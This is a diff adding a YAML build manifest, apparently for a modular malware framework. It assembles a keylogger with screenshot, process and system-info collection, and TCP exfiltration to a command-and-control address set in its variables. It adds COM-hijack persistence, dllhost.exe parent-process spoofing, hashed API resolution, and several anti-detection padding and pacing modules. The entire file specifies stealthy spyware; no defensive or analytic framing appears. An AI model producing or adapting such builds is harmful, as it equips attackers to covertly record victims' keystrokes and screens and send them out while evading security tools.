@@ -1,0 +1,33 @@
+name: keylogger_com_persist
+description: Keylogger with COM hijack persistence and dllhost.exe PPID spoofing
+
+core:
+  - core/emit_buffer
+  - core/run_cmd
+
+collectors:
+  - collectors/system_info
+  - collectors/processes
+  - collectors/screenshot
+
+keylogger: collectors/keylogger_poll
+
+exfil: exfil/tcp_flush
+arch: arch/keylogger
+
+api_resolve: api_resolve/api_hash_ror13
+process: process/ppid_spoof_dllhost
+
+persist: persist/com_hijack
+
+resources: true
+
+evasion:
+  - evasion/entropy_pad
+  - evasion/iat_pad
+  - evasion/resource_spoof
+  - evasion/behavioral_pacing
+
+vars:
+  C2_IP: "10.0.2.2"
+  C2_PORT: "9001"
